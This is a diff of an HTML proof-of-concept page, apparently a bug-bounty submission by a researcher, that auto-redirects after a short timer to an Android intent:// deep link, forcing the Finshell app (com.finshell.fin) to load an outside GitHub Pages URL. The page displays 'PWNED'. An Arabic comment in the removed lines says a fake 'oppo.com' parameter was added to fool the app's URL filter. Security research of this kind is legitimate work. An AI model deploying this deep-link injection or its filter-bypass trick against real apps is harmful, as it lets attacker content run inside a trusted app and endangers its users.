@@ -1,26 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html style="background-color: #FF0000; margin: 0; padding: 0;">
 <head>
-    <title>PoC</title>
+    <title>Pwned</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="background-color: black !important; color: yellow !important; text-align: center; padding: 50px;">
+<body style="background-color: #FF0000; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; margin: 0;">
 
-    <h1 style="font-size: 50px;">!!! PWNED !!!</h1>
-    <h2 style="font-size: 30px;">Researcher: yazid47</h2>
-    <p>If you see this inside Finshell, the injection is successful.</p>
+    <h1 style="font-size: 45px; font-weight: bold; margin-bottom: 20px;">!!! PWNED !!!</h1>
+    
+    <h2 style="font-size: 30px; margin-bottom: 20px;">Researcher: yazid47</h2>
+    
+    <p style="font-size: 20px; padding: 0 20px; line-height: 1.5;">
+        If you see this inside Finshell, <br>
+        <b>the injection is successful.</b>
+    </p>
 
     <script>
-        function trigger() {
-            // الخدعة: أضفنا اسم أوبو كمعامل وهمي لخدع الفلتر
-            var target = "https://yazidtokyo43.github.io/oppo-tes/?v=oppo.com";
+        function forceUpdate() {
+            // إضافة رقم عشوائي كبير جداً لضمان عدم ظهور النسخة القديمة
+            var uniqueID = new Date().getTime();
+            var target = "https://yazidtokyo43.github.io/oppo-tes/index.html?update=" + uniqueID;
             var intent = "intent://web?url=" + target + "#Intent;scheme=finshell;package=com.finshell.fin;S.browser_fallback_url=" + target + ";end";
+            
             window.location.href = intent;
         }
-        // محاولة التشغيل بعد ثانيتين لضمان استقرار التطبيق
-        setTimeout(trigger, 2000);
-    </script>
 
+        // تشغيل التحويل بعد ثانية
+        setTimeout(forceUpdate, 1000);
+    </script>
 </body>
 </html>
